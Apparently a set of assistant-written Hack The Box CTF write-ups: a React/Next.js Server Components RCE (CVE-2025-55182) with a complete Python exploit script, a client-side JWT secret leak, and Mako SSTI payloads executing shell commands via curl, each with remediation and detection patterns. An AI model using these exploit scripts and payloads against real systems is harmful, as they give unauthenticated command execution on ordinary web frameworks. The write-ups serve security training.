Therefore, the correct path was not:

```text
Try random payloads in the UI
```

The correct path was:

```text
Analyze framework version
Confirm RSC behavior
Trigger the vulnerable React/Next.js internal processing path
Obtain RCE
Read /app/flag.txt
```

---

## 9. Preparing the Python Environment

Initially, installing Python packages globally failed because the system was externally managed:

```text
error: externally-managed-environment
```

This is common on modern Debian/Kali systems.

To avoid breaking the system Python environment, I created a virtual environment:

```bash
python3 -m venv .venv
source .venv/bin/activate
python -m pip install --upgrade pip
pip install requests
```

### Why use a virtual environment?

A virtual environment is like a separate toolbox for one project.

Instead of installing packages globally and potentially damaging the system Python setup, we install them only inside the current project folder.

In this case, the final script used Python standard libraries, so `requests` was not strictly required. However, setting up a virtual environment is still a good habit for CTF and security research work.

---

## 10. Exploit Script

The exploit script was saved as:

```bash
react2shell_nopip.py
```

The script:

```python
#!/usr/bin/env python3
import sys
import json
import urllib.request
import urllib.error

if len(sys.argv) < 3:
    print(f"Usage: {sys.argv[0]} <target_url> <command>")
    sys.exit(1)

target = sys.argv[1].rstrip("/") + "/"
cmd = sys.argv[2]

# The payload executes a system command using Node.js child_process.
# The output is placed into the React error digest so we can read it from the response.
js = (
    "var res = process.mainModule.require('child_process')"
    f".execSync({cmd!r}, {{timeout: 5000}}).toString();"
    "throw Object.assign(new Error('NEXT_REDIRECT'), {digest: res});"
    "//"
)

payload = {
    "then": "$1:__proto__:then",
    "status": "resolved_model",
    "reason": -1,
    "value": "{\"then\":\"$B1337\"}",
    "_response": {
        "_prefix": js,
        "_formData": {
            "get": "$1:constructor:constructor"
        }
    }
}

boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"

def field(name, value):
    return (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="{name}"\r\n\r\n'
        f"{value}\r\n"
    ).encode()

body = b"".join([
    field("0", json.dumps(payload, separators=(",", ":"))),
    field("1", "\"$@0\""),
    f"--{boundary}--\r\n".encode(),
])

req = urllib.request.Request(
    target,
    data=body,
    method="POST",
    headers={
        "User-Agent": "Mozilla/5.0",
        "Next-Action": "x",
        "Content-Type": f"multipart/form-data; boundary={boundary}",
    },
)

try:
    with urllib.request.urlopen(req, timeout=15) as resp:
        print(f"[status] {resp.status}")
        print("[headers]")
        for k, v in resp.headers.items():
            if k.lower() in ["x-action-redirect", "location", "content-type"]:
                print(f"{k}: {v}")
        print("[body]")
        print(resp.read().decode("utf-8", "replace")[:5000])

except urllib.error.HTTPError as e:
    print(f"[status] {e.code}")
    print("[headers]")
    for k, v in e.headers.items():
        if k.lower() in ["x-action-redirect", "location", "content-type"]:
            print(f"{k}: {v}")
    print("[body]")
    print(e.read().decode("utf-8", "replace")[:5000])
```

Make the script executable:

```bash
chmod +x react2shell_nopip.py
```

---

## 11. Exploit Script Explanation

### 11.1 Target and command input

```python
target = sys.argv[1].rstrip("/") + "/"
cmd = sys.argv[2]
```

The script takes two arguments:

```bash
python3 react2shell_nopip.py <target_url> <command>
```

Example:

```bash
python3 react2shell_nopip.py "$TARGET" "id"
```

This means:

```text
Send the exploit to the target and ask the server to execute the command: id
```

---

### 11.2 JavaScript command execution payload

```python
js = (
    "var res = process.mainModule.require('child_process')"
    f".execSync({cmd!r}, {{timeout: 5000}}).toString();"
    "throw Object.assign(new Error('NEXT_REDIRECT'), {digest: res});"
    "//"
)
```

This creates JavaScript code that runs on the vulnerable Node.js server.

The important part:

```javascript
process.mainModule.require('child_process').execSync("id")
```

`child_process` is a Node.js module that can execute operating system commands.

So if the command is:

```bash
id
```

The server runs:

```bash
id
```

If the command is:

```bash
cat /app/flag.txt
```

The server runs:

```bash
cat /app/flag.txt
```

---

### 11.3 Why throw an error?

```javascript
throw Object.assign(new Error('NEXT_REDIRECT'), {digest: res});
```

This is a trick to return the command output to us.

The command output is stored in:

```javascript
res
```

Then the script forces an error and places the output inside the error's `digest`.

That is why the server responds with HTTP status `500`.

In this exploit, `500 Internal Server Error` is not failure. It is expected behavior.

The error becomes a container for the command output.

---

### 11.4 Malicious React payload structure

```python
payload = {
    "then": "$1:__proto__:then",
    "status": "resolved_model",
    "reason": -1,
    "value": "{\"then\":\"$B1337\"}",
    "_response": {
        "_prefix": js,
        "_formData": {
            "get": "$1:constructor:constructor"
        }
    }
}
```

This structure abuses the way React processes internal serialized data.

The payload uses fields such as:

```text
then
__proto__
constructor
_response
_prefix
_formData
```

The goal is to reach an unsafe internal processing path where our JavaScript payload is evaluated.

In simple words:

> We send data that looks like internal React data, but it is shaped in a malicious way so the server accidentally executes our code.

---

### 11.5 Multipart form-data body

```python
boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"
```

The exploit is sent as `multipart/form-data`.

This matters because Next.js Server Actions often process form-like requests.

The script builds form fields manually:

```python
body = b"".join([
    field("0", json.dumps(payload, separators=(",", ":"))),
    field("1", "\"$@0\""),
    f"--{boundary}--\r\n".encode(),
])
```

Field `0` contains the malicious payload.

Field `1` references field `0`.

Think of it like this:

```text
Envelope 0 contains the dangerous instruction.
Envelope 1 tells React to process Envelope 0.
```

---

### 11.6 The `Next-Action` header

```python
"Next-Action": "x",
```

This header tells Next.js to process the request through a special internal path related to Server Actions.

Without this header, the server may treat the request like a normal web request.

With this header, the request is routed into the interesting React/Next.js processing layer.

---

## 12. Testing RCE with `id`

Before reading the flag, I tested whether command execution worked:

```bash
python3 react2shell_nopip.py "$TARGET" "id"
```

The result:

```text
[status] 500
[headers]
Content-Type: text/x-component
[body]
0:{"a":"$@1","f":"","b":"s8I48LfEDhqpCdFN5-HbU"}
1:E{"digest":"uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)\n"}
```

### Why use `id` first?

The `id` command is a safe and simple way to confirm RCE.

It answers:

```text
Did the command execute?
Which user executed it?
Can we see the output?
```

The output confirmed:

```text
uid=0(root)
```

This means the command was executed as root inside the container.

---

## 13. Reading the Flag

After confirming RCE, I read the flag:

```bash
python3 react2shell_nopip.py "$TARGET" "cat /app/flag.txt"
```

The response:

```text
[status] 500
[headers]
Content-Type: text/x-component
[body]
0:{"a":"$@1","f":"","b":"s8I48LfEDhqpCdFN5-HbU"}
1:E{"digest":"HTB{jus7_1n_c4s3_y0u_m1ss3d_r34ct2sh3ll___cr1t1c4l_un4uth3nt1c4t3d_RCE_1n_R34ct___CVE-2025-55182}\n"}
```

Final flag:

```text
HTB{jus7_1n_c4s3_y0u_m1ss3d_r34ct2sh3ll___cr1t1c4l_un4uth3nt1c4t3d_RCE_1n_R34ct___CVE-2025-55182}
```

---

## 14. Understanding the `500` Response

The exploit returned:

```text
[status] 500
```

Normally, `500` means the server crashed or encountered an internal error.

In this exploit, the `500` is expected because the payload intentionally throws an error:

```javascript
throw Object.assign(new Error('NEXT_REDIRECT'), {digest: res});
```

The command output is stored inside:

```text
digest
```

So this response is successful from an exploitation perspective.

---

## 15. Analogy: The Restaurant and the Kitchen

Imagine the website is a restaurant.

The normal website UI is the dining area:

```text
Nice design
Buttons
Marketing text
Friendly interface
```

But the React Server Components layer is like the restaurant kitchen.

Normal visitors should never control the kitchen.

However, due to the vulnerability, we can send a fake internal kitchen order:

```text
Please run this kitchen machine command:
cat /app/flag.txt
```

The kitchen accepts the fake order because the internal validation is broken.

Then we force the kitchen to throw an error message that includes the result of our command.

That is how the flag comes back to us.

---

## 16. Attack Flow Summary

```text
Start target
↓
Check HTTP headers
↓
Confirm Next.js and RSC behavior
↓
Inspect provided source code
↓
Find vulnerable Next.js/React versions
↓
Read Dockerfile to locate flag path
↓
Build malicious React Server Components payload
↓
Send POST request with Next-Action header
↓
Trigger command execution through Node.js child_process
↓
Confirm RCE with id
↓
Read /app/flag.txt
↓
Capture flag
```

---

## 17. Security Impact

This vulnerability is critical because it allows:

```text
Unauthenticated Remote Code Execution
```

That means an attacker does not need:

- A valid account
- A password
- A session token
- User interaction
- Admin access

With only network access to the vulnerable application, an attacker may be able to execute commands on the server.

Potential real-world impact:

- Read sensitive files
- Dump environment variables
- Steal secrets and API keys
- Access source code
- Modify application files
- Create backdoors
- Pivot to internal systems
- Compromise cloud credentials

---

## 18. Defensive Recommendations

### 18.1 Patch vulnerable dependencies

Upgrade Next.js and React to patched versions.

For this challenge, the application used:

```json
"next": "16.0.6"
```

A patched version for this line would be:

```bash
npm install next@16.0.7
```

Also update React and React DOM to patched versions recommended by the official advisory.

---

### 18.2 Do not run containers as root

The command `id` showed:

```text
uid=0(root)
```

Running the application as root increases impact.

A better Dockerfile should create a non-root user and run the app as that user.

Example:

```dockerfile
RUN addgroup --system nodejs && adduser --system nextjs
USER nextjs
```

---

### 18.3 Monitor suspicious requests

Defenders should monitor for suspicious requests containing:

```text
Next-Action
multipart/form-data
text/x-component
__proto__
constructor
_response
_prefix
```

These may indicate exploitation attempts against React/Next.js internals.

---

### 18.4 Rotate secrets after compromise

If a vulnerable application was exposed publicly, assume secrets may have been accessed.

Rotate:

- API keys
- Database credentials
- JWT secrets
- Cloud credentials
- Deployment tokens
- Webhook secrets

---

## 19. Lessons Learned

This challenge teaches several important lessons:

### 19.1 A clean UI does not mean a safe application

The visible NexusAI page looked harmless.

But the vulnerability was hidden in the framework layer.

---

### 19.2 Always check dependency versions

The source code did not contain an obvious `eval()` or unsafe function.

The real issue came from vulnerable framework versions.

Dependency analysis is a key part of web security.

---

### 19.3 Read deployment files

The Dockerfile revealed the exact location of the flag:

```bash
/app/flag.txt
```

In real-world assessments, Dockerfiles can reveal:

- Runtime paths
- Exposed ports
- Secrets handling mistakes
- Privilege level
- Build process
- File locations

---

### 19.4 Confirm exploit primitives step by step

Instead of immediately reading the flag, I first ran:

```bash
id
```

This confirmed:

```text
RCE works
Output is visible
The process runs as root
```

Then I safely proceeded to:

```bash
cat /app/flag.txt
```

This is a clean exploitation workflow.

---

## 20. Final Result

The challenge was solved by exploiting a vulnerable React/Next.js Server Components layer and reading the flag from the server filesystem.

Final flag:

```text
HTB{jus7_1n_c4s3_y0u_m1ss3d_r34ct2sh3ll___cr1t1c4l_un4uth3nt1c4t3d_RCE_1n_R34ct___CVE-2025-55182}
```

---

## 21. Key Takeaway

The main lesson:

> Modern web security is not only about testing forms and endpoints. Sometimes the most dangerous bug lives inside the framework that renders the page.

In this challenge, the visible website was only the surface.

The real vulnerability was buried in the React/Next.js server-side rendering and component processing layer.

That is why the correct path was:

```text
Framework fingerprinting
→ Dependency analysis
→ React Server Components exploit
→ Remote Code Execution
→ Read flag
```


## CHAT 23
Mantap, ini memang tipe challenge **“OpenSecret” literally open secret** — flagnya kebuka karena **JWT secret hardcoded di client-side source code**. Berikut write-up versi profesional, cocok buat `Report.md` di GitHub/portfolio.

````markdown
# HTB OpenSecret Write-up

## Challenge Information

| Category | Difficulty | Platform |
|---|---:|---|
| Web | Very Easy | Hack The Box |

## Challenge Scenario

A simple help desk portal where users can submit support tickets. The application uses JWT tokens for session management, but something seems off about how they're implemented. The objective is to identify the security flaw and retrieve the flag.

---

## Executive Summary

The OpenSecret web challenge contains a critical security misconfiguration where the JWT signing secret is exposed directly in the client-side JavaScript source code. Since JavaScript delivered to the browser can be viewed by any user, the secret is no longer confidential.

During source code review, I discovered that the application generates JWT tokens directly in the browser and stores them in a cookie named `session_token`. The JWT secret key was hardcoded in the page source, allowing anyone to view it without authentication. The exposed value was the challenge flag itself.

**Vulnerability:** Hardcoded JWT Secret in Client-Side JavaScript  
**Impact:** Secret disclosure, token forgery, authentication bypass  
**Root Cause:** JWT signing logic was implemented on the frontend instead of the backend  

---

## Reconnaissance

After starting the challenge instance, I accessed the web application through the provided IP and port.

The application presented a simple help desk support portal where users could submit tickets. At first glance, there was no obvious input vulnerability such as SQL injection, XSS, or file upload abuse.

Since the challenge description specifically mentioned JWT tokens, I focused on inspecting how the session was created and handled.

---

## Source Code Review

I opened the browser page source and reviewed the embedded JavaScript code.

Inside the JavaScript section, I found the following suspicious line:

```js
const SECRET_KEY = "HTB{0p3n_s3cr3ts_ar3_n0t_s3cr3ts}";
````

This immediately revealed the main vulnerability: the JWT secret key was exposed in the frontend source code.

The same source code also showed that the application generated JWT tokens directly in the browser using the `HS256` algorithm:

```js
const header = { alg: "HS256", typ: "JWT" };
const payload = { username: username };
```

The token was then signed using the exposed `SECRET_KEY` and stored in a cookie named `session_token`:

```js
document.cookie = `session_token=${token}; path=/; max-age=86400`;
```

This confirms that the session mechanism is fully exposed to the client side. The source code shows the secret key, JWT header, payload creation, HMAC signing process, and cookie storage behavior. 

---

## Vulnerability Analysis

JWTs are commonly used for session management. A JWT signed with `HS256` uses a shared secret key to verify that the token has not been modified.

In a secure implementation, the signing secret must only exist on the server. The browser should only receive the final signed token, not the secret used to generate it.

In this challenge, the application made a critical mistake:

```text
JWT secret was placed inside client-side JavaScript.
```

Because frontend JavaScript is public to every user, the secret is no longer secret. Anyone can inspect the page source, extract the key, and potentially generate valid JWTs.

This can lead to:

* Authentication bypass
* User impersonation
* Privilege escalation
* Forged admin tokens
* Unauthorized access to protected routes

In this specific challenge, the exposed secret was also the flag.

---

## Exploitation Steps

### Step 1 — Open the Web Application

Access the challenge instance in the browser:

```bash
http://TARGET_IP:PORT
```

The application shows a basic support ticket submission portal.

---

### Step 2 — View Page Source

Right-click on the page and select:

```text
View Page Source
```

Alternatively, use the browser shortcut:

```text
Ctrl + U
```

---

### Step 3 — Inspect the JavaScript Code

Inside the page source, the JavaScript code contains the JWT generation logic.

The most important finding is:

```js
const SECRET_KEY = "HTB{0p3n_s3cr3ts_ar3_n0t_s3cr3ts}";
```

This value is exposed directly to the user.

---

### Step 4 — Retrieve the Flag

Because the exposed JWT secret is formatted as an HTB flag, the flag is:

```text
HTB{0p3n_s3cr3ts_ar3_n0t_s3cr3ts}
```

---

## Proof of Concept

The issue can be verified simply by viewing the page source or using `curl`:

```bash
curl -s http://TARGET_IP:PORT/ | grep SECRET_KEY
```

Expected result:

```js
const SECRET_KEY = "HTB{0p3n_s3cr3ts_ar3_n0t_s3cr3ts}";
```

This confirms that sensitive cryptographic material is exposed publicly.

---

## Why This Is Dangerous

This vulnerability is not just about leaking a flag. In a real-world application, exposing a JWT secret would be a serious security issue.

If an attacker knows the JWT secret, they can create their own valid tokens.

For example, if the original token payload is:

```json
{
  "username": "guest_1234"
}
```

An attacker could forge a token like:

```json
{
  "username": "admin"
}
```

If the backend trusts the JWT payload without additional authorization checks, the attacker may gain admin access.

---

## Root Cause

The root cause is poor separation between frontend and backend responsibilities.

The application performs JWT signing on the client side:

```text
Browser generates JWT → Browser signs JWT → Browser stores JWT
```

This is insecure because the browser is controlled by the user. Anything sent to the browser should be treated as public.

A secure design should be:

```text
Server generates JWT → Server signs JWT → Browser only receives signed JWT
```

The client should never know the signing secret.

---

## Remediation

To prevent this vulnerability, developers should apply the following security controls:

### 1. Never Store Secrets in Frontend Code

JWT secrets, API keys, private keys, database credentials, and signing keys must never be placed in JavaScript files served to users.

Bad example:

```js
const SECRET_KEY = "super-secret-key";
```

Good approach:

```text
Store secrets in backend environment variables.
```

---

### 2. Generate and Sign JWTs on the Server

JWT creation should happen only on the backend.

Example secure flow:

```text
User logs in
→ Server validates credentials
→ Server signs JWT using private secret
→ Server sends signed token to user
→ User sends token back in future requests
→ Server verifies token
```

---

### 3. Enforce Authorization on the Backend

The frontend can hide or show UI elements, but real permission checks must happen on the server.

Never rely only on frontend logic such as:

```js
if (user.role === "admin") {
  showAdminPanel();
}
```

The backend must verify whether the user is truly allowed to access admin resources.

---

### 4. Rotate Exposed Secrets Immediately

If a JWT secret is exposed, all tokens signed with that secret should be considered compromised.

The correct response is:

```text
1. Remove the exposed secret from the frontend.
2. Generate a new secret.
3. Invalidate old tokens.
4. Redeploy the application.
5. Review logs for suspicious activity.
```

---

## Lessons Learned

This challenge demonstrates an important web security principle:

```text
Anything in frontend source code is public.
```

Even if the code is minified, obfuscated, or bundled, users can still inspect it. Secrets must always remain on the server side.

JWT is not insecure by default. The insecurity comes from poor implementation, such as exposing the signing secret or trusting user-controlled claims without proper validation.

---

## Final Flag

```text
HTB{0p3n_s3cr3ts_ar3_n0t_s3cr3ts}
```

---

## Conclusion

The OpenSecret challenge highlights a simple but critical security mistake: placing sensitive JWT signing material in client-side JavaScript. By reviewing the page source, I identified the hardcoded JWT secret and retrieved the flag.

This vulnerability could have severe consequences in a real-world environment, including token forgery, privilege escalation, and complete authentication bypass.

The key takeaway is clear:

```text
Secrets must never be shipped to the client.
```

````

Untuk judul repo GitHub yang keren:

```text
HTB-OpenSecret-JWT-Secret-Disclosure
````

Deskripsi repo:

```text
Professional write-up for Hack The Box OpenSecret, demonstrating JWT secret disclosure through client-side JavaScript source code review.
```


## CHAT 24
# 🎃 Hack The Box — Spookifier Writeup

> **Category:** Web Exploitation  
> **Difficulty:** Very Easy  
> **Main Vulnerability:** Server-Side Template Injection (SSTI)  
> **Template Engine:** Mako  
> **Impact:** Remote Command Execution inside the challenge container  
> **Status:** Solved  
> **Flag:** `HTB{REDACTED_FOR_PUBLIC_WRITEUP}`

---

## 1. Executive Summary

Spookifier is a Hack The Box web challenge where the application generates a spooky version of a user-provided name. At first glance, the website looks like a simple text transformation app. The user submits a name through the `text` parameter, and the backend returns several spooky-font variations of that input.

After reviewing the provided source code, I found that the application takes user-controlled input, inserts it into an HTML string, and then renders that string again using the Mako template engine:

```python
return Template(result).render()
```

This behavior creates a **Server-Side Template Injection (SSTI)** vulnerability. Because user input is interpreted as template code, an attacker can inject Mako expressions such as `${7*7}` and have them evaluated by the server.

The vulnerability was confirmed when the payload `${7*7}` returned `49`. After that, I used Mako object traversal to access Python functionality and execute system commands inside the lab container. Finally, I read the flag from `/flag.txt`, whose location was identified from the `Dockerfile`.

---

## 2. Challenge Context

The challenge scenario says:

> There's a new trend of an application that generates a spooky name for you. Users of that application later discovered that their real names were also magically changed, causing havoc in their life. Could you help bring down this application?

This scenario is a hint that the application does more than simply display text. The phrase "magically changed" suggests that user input may be processed in an unsafe or unexpected way.

Target:

```text
http://154.57.164.67:31910
```

---

## 3. Methodology

The approach used in this challenge:

```text
1. Understand normal application behavior
2. Inspect frontend behavior using browser DevTools
3. Review the provided source code
4. Trace user input from request to rendering
5. Identify unsafe template rendering
6. Confirm SSTI with a harmless arithmetic payload
7. Escalate from SSTI to command execution
8. Locate and read the flag
9. Analyze the vulnerability from a defensive perspective
```

The key mindset is simple:

> Do not guess the exploit first. Follow the data flow.

In web security, one of the most important skills is tracking how user input moves through the application.

---

## 4. Initial Reconnaissance

### 4.1 Opening the Application

I first opened the web application in the browser:

```text
http://154.57.164.67:31910/?text=rey
```

The application displayed a Halloween-themed page called **Name Spookifier**. When I submitted a name, it returned several spooky-looking variations of the same input.

Example behavior:

```text
Input  : rey
Output : multiple spooky-font versions of "rey"
```

At this stage, the application seemed like a normal text styling generator.

### 4.2 Browser DevTools Inspection

I opened the browser DevTools and checked the **Network** tab.

Observed requests included:

```text
GET /?text=rey
GET /static/css/bootstrap.min.css
GET /static/css/index.css
GET /static/images/vamp.png
GET /favicon.ico
```

There were no suspicious JavaScript files, hidden APIs, or client-side logic that looked exploitable.

This suggested that the important logic was likely happening on the backend.

**Conclusion from recon:**

```text
The frontend is mostly static.
The interesting behavior is likely server-side.
```

---

## 5. Source Code Review

The challenge provided a downloadable source archive: `Spookifier.zip`.

After extracting it, the project structure looked like this:

```text
.
├── build-docker.sh
├── challenge
│   ├── application
│   │   ├── blueprints
│   │   ├── main.py
│   │   ├── static
│   │   ├── templates
│   │   └── util.py
│   └── run.py
├── config
│   └── supervisord.conf
├── Dockerfile
└── flag.txt
```

Important files:

```text
challenge/application/blueprints/routes.py
challenge/application/util.py
challenge/application/templates/index.html
Dockerfile
```

---

## 6. Tracing User Input

### 6.1 Input Handling in `routes.py`

The main route is defined in `routes.py`:

```python
from flask import Blueprint, request
from flask_mako import render_template
from application.util import spookify

web = Blueprint('web', __name__)

@web.route('/')
def index():
    text = request.args.get('text')
    if(text):
        converted = spookify(text)
        return render_template('index.html', output=converted)

    return render_template('index.html', output='')
```

The important lines are:

```python
text = request.args.get('text')
converted = spookify(text)
return render_template('index.html', output=converted)
```

This means the application takes user input from the query parameter:

```text
?text=
```

Then passes it into:

```python
spookify(text)
```

So the input flow starts like this:

```text
User input from ?text=
        ↓
routes.py
        ↓
spookify(text)
```

---

## 7. Understanding the Spookify Logic

Inside `util.py`, the `spookify()` function processes the user input:

```python
def spookify(text):
    converted_fonts = change_font(text_list=text)
    return generate_render(converted_fonts=converted_fonts)
```

The function does two things:

```text
1. Converts the input into several spooky font styles
2. Passes the result into generate_render()
```

So the flow becomes:

```text
User input
   ↓
spookify()
   ↓
change_font()
   ↓
generate_render()
```

---

## 8. The Vulnerable Function

The most important function is `generate_render()`:

```python
def generate_render(converted_fonts):
    result = '''
        <tr>
            <td>{0}</td>
        </tr>
        
        <tr>
            <td>{1}</td>
        </tr>
        
        <tr>
            <td>{2}</td>
        </tr>
        
        <tr>
            <td>{3}</td>
        </tr>

    '''.format(*converted_fonts)
    
    return Template(result).render()
```

The dangerous line is:

```python
return Template(result).render()
```

This is the root cause of the vulnerability.

The application first creates an HTML string using user-controlled data, then renders that string again as a Mako template.

This means if user input contains Mako template syntax, the server may evaluate it.

---

## 9. Vulnerability Explanation

### 9.1 What is Server-Side Template Injection?

Server-Side Template Injection, or SSTI, happens when user-controlled input is processed by a server-side template engine as template code.

A template engine is normally used to generate dynamic HTML.

For example:

```mako
Hello, ${name}
```

If `name` is `rey`, the output becomes:

```text
Hello, rey
```

That is normal and safe when the template itself is controlled by the developer.

The danger happens when the user can control the template content itself.

In this challenge, the application effectively does this:

```python
Template(user_controlled_data).render()
```

That means user input is not treated only as text. It can be treated as executable template syntax.

### 9.2 Simple Analogy

Imagine a restaurant where customers write their name on a paper.

Normal behavior:

```text
Customer writes: Rey
Waiter prints: Rey
```

Unsafe behavior:

```text
Customer writes: ${7*7}
Waiter does not print it as text.
Waiter calculates it and prints: 49
```

That is what happened here.

The server should only display the user input, but instead it interprets the input as instructions.

---

## 10. Confirming the Vulnerability

To safely test whether the server evaluates template expressions, I used a harmless arithmetic payload:

```text
${7*7}
```

Command:

```bash
curl -sG 'http://154.57.164.67:31910/' \
  --data-urlencode 'text=${7*7}' \
  | grep -o "49"
```

Output:

```text
49
```

This confirms that the expression was evaluated server-side.

If the application were safe, it would display `${7*7}` as plain text. Instead, it returned `49`, proving that the Mako template engine executed the expression.

**Checkpoint result:**

```text
Input  : ${7*7}
Output : 49
Result : SSTI confirmed
```

---

## 11. From SSTI to Command Execution

After confirming SSTI, the next step was to understand whether the template context allowed access to Python internals.

A known Mako object traversal payload can access Python functionality through the template object:

```mako
${self.module.cache.util.os.popen("id").read()}
```

The command used:

```bash
curl -sG 'http://154.57.164.67:31910/' \
  --data-urlencode 'text=${self.module.cache.util.os.popen("id").read()}'
```

Relevant output:

```text
uid=0(root) gid=0(root) groups=0(root),...
```

This confirmed command execution inside the challenge container.

**Checkpoint result:**

```text
Input  : ${self.module.cache.util.os.popen("id").read()}
Output : uid=0(root) gid=0(root) groups=0(root),...
Result : Command execution confirmed
```

---

## 12. Locating the Flag

To avoid guessing the flag location, I checked the `Dockerfile`.

Relevant line:

```dockerfile
COPY flag.txt /flag.txt
```

This tells us that during container build, the flag file is copied into:

```text
/flag.txt
```

So the target file is known from the source code.

**Checkpoint result:**

```text
Dockerfile shows: COPY flag.txt /flag.txt
Flag location  : /flag.txt
```

---

## 13. Retrieving the Flag

After confirming command execution and identifying the flag location, I used the SSTI payload to read `/flag.txt`.

Command:

```bash
curl -sG 'http://154.57.164.67:31910/' \
  --data-urlencode 'text=${self.module.cache.util.os.popen("cat /flag.txt").read()}' \
  | grep -oE 'HTB\{[^}]+\}'
```

Output:

```text
HTB{REDACTED_FOR_PUBLIC_WRITEUP}
```

For a public portfolio writeup, it is better to redact the full flag.

---

## 14. Complete Attack Flow

```text
1. Open the application
2. Identify the text query parameter
3. Inspect frontend behavior
4. Find no suspicious client-side logic
5. Extract and review source code
6. Locate input handling in routes.py
7. Trace input into spookify()
8. Review generate_render()
9. Discover Template(result).render()
10. Confirm SSTI using ${7*7}
11. Confirm command execution using id
12. Check Dockerfile for flag location
13. Read /flag.txt
14. Retrieve the flag
```

---

## 15. Why the Exploit Works

The vulnerability exists because the application renders user-controlled content as a template.

The insecure flow:

```text
User input
   ↓
Inserted into HTML string
   ↓
HTML string passed to Mako Template()
   ↓
Mako evaluates template expressions
   ↓
User payload executes
```

The unsafe code:

```python
return Template(result).render()
```

The server interprets this input:

```mako
${7*7}
```

As a Mako expression.

So the result becomes:

```text
49
```

The same behavior allows more advanced payloads that access Python objects and execute commands.

---

## 16. Security Impact

The impact is serious.

An attacker who can inject template syntax can potentially:

```text
- Read local files
- Execute system commands
- Access environment variables
- Leak secrets
- Enumerate the container
- Compromise the application runtime
```

In this challenge, the impact was demonstrated by reading:

```text
/flag.txt
```

In a real production environment, similar vulnerabilities could expose:

```text
- API keys
- Database credentials
- Session secrets
- Internal service tokens
- Cloud metadata
- Application source code
```

---

# 🛡️ 17. Blue Team Perspective

From a defender's point of view, this challenge is not only about exploitation. It also teaches how to prevent and detect insecure template rendering.

## 17.1 Root Cause

The root cause is unsafe template rendering:

```python
Template(result).render()
```

Where `result` contains user-controlled data.

This violates a core secure coding principle:

> User input must be treated as data, not executable code.

## 17.2 Secure Fix

The application does not need to render `result` again as a Mako template.

Instead of:

```python
return Template(result).render()
```

A safer approach would be:

```python
return result
```

The output should be treated as plain data, not as a template.

## 17.3 Escape User-Controlled Output

When displaying user-controlled content in HTML, output encoding should be applied.

Example secure mindset:

```text
User input should be escaped before being inserted into HTML.
```

This helps prevent:

```text
- SSTI
- XSS
- HTML injection
```

Depending on the framework and template engine, developers should use built-in escaping features instead of manually building HTML strings.

## 17.4 Avoid Building HTML with String Formatting

This pattern is risky:

```python
'''
<tr>
    <td>{0}</td>
</tr>
'''.format(user_input)
```

A safer approach is to keep HTML inside template files and pass variables safely through the template engine.

Instead of generating HTML manually in Python, the app should let the template file handle presentation.

## 17.5 Principle of Least Privilege

The command execution output showed the application running as root:

```text
uid=0(root)
```

That increases the impact of any vulnerability.

In production, the application should run as a low-privileged user.

Recommended controls:

```text
- Do not run web applications as root
- Use a dedicated non-root container user
- Apply read-only filesystem where possible
- Restrict access to sensitive files
- Use AppArmor, SELinux, or seccomp profiles
- Avoid placing secrets directly in the filesystem
```

## 17.6 Detection Opportunities

Blue teams can monitor for suspicious template payloads in HTTP logs.

Examples of suspicious patterns:

```text
${7*7}
${self.module
os.popen
subprocess
__class__
__mro__
__subclasses__
```

Possible detection logic:

```text
Alert when query parameters contain template syntax such as ${...}
Alert when payloads contain references to Python internals
Alert when HTTP requests include command execution keywords
```

Example suspicious request:

```text
GET /?text=${7*7}
GET /?text=${self.module.cache.util.os.popen("id").read()}
```

## 17.7 Hardening Checklist

Recommended remediations:

```text
[ ] Never render user input as a template
[ ] Remove Template(result).render()
[ ] Escape all user-controlled output
[ ] Avoid manual HTML string formatting
[ ] Keep HTML inside template files
[ ] Run the application as a non-root user
[ ] Add server-side input validation
[ ] Monitor logs for SSTI payloads
[ ] Use dependency scanning
[ ] Add security tests for template injection
```

---

## 18. Lessons Learned

This challenge teaches several important lessons:

```text
1. Frontend inspection alone is not enough.
2. Source code review is powerful when available.
3. User input tracing helps reveal hidden vulnerabilities.
4. Template engines can become dangerous when user input is rendered as template code.
5. A harmless arithmetic payload is a safe way to confirm SSTI.
6. Dockerfile review can reveal important runtime details.
7. Defensive thinking is as important as exploitation.
```

---

## 19. Final Conclusion

The Spookifier challenge was vulnerable to **Server-Side Template Injection** because user-controlled input was inserted into an HTML string and then rendered again using Mako's `Template(result).render()`.

The vulnerability was confirmed using the payload:

```mako
${7*7}
```

which returned:

```text
49
```

After confirming SSTI, command execution was achieved through Mako object traversal. The flag location was discovered in the `Dockerfile`, where `flag.txt` was copied to `/flag.txt`. Finally, the flag was retrieved by reading that file through the SSTI payload.

This challenge demonstrates how a small mistake in template rendering can escalate into full command execution. From a blue team perspective, the correct mitigation is to never render user-controlled input as template code, apply output encoding, avoid running applications as root, and monitor logs for template injection patterns.

---

## 20. Key Takeaway

> The application did not simply display the user's spooky name.  
> It accidentally treated the user's input as template code.  
> That mistake turned a harmless name generator into a command execution vulnerability.

---

## Appendix — Commands Used

### Test normal input

```bash
curl -sG 'http://154.57.164.67:31910/' \
  --data-urlencode 'text=rey'
```

### Confirm SSTI

```bash
curl -sG 'http://154.57.164.67:31910/' \
  --data-urlencode 'text=${7*7}' \
  | grep -o "49"
```

### Confirm command execution

```bash
curl -sG 'http://154.57.164.67:31910/' \
  --data-urlencode 'text=${self.module.cache.util.os.popen("id").read()}'
```

### Read flag

```bash
curl -sG 'http://154.57.164.67:31910/' \
  --data-urlencode 'text=${self.module.cache.util.os.popen("cat /flag.txt").read()}' \
  | grep -oE 'HTB\{[^}]+\}'
```

---

## Suggested Screenshot Placement

For a professional portfolio writeup, include screenshots in this order:

```text
1. Challenge overview from Hack The Box
2. Initial application page
3. Browser DevTools Network tab
4. Project structure after extracting source code
5. routes.py showing text parameter input
6. util.py showing Template(result).render()
7. SSTI confirmation: ${7*7} -> 49
8. Command execution confirmation using id
9. Dockerfile showing COPY flag.txt /flag.txt
10. Flag retrieval with flag partially redacted
```

Recommended folder structure:

```text
Spookifier-HTB-Writeup/
├── README.md
├── writeup.md
└── assets/
    ├── 01-challenge-overview.png
    ├── 02-initial-application.png
    ├── 03-network-recon.png
    ├── 04-project-structure.png
    ├── 05-routes-input-flow.png
    ├── 06-vulnerable-template-render.png
    ├── 07-ssti-proof.png
    ├── 08-rce-proof.png
    ├── 09-dockerfile-flag-location.png
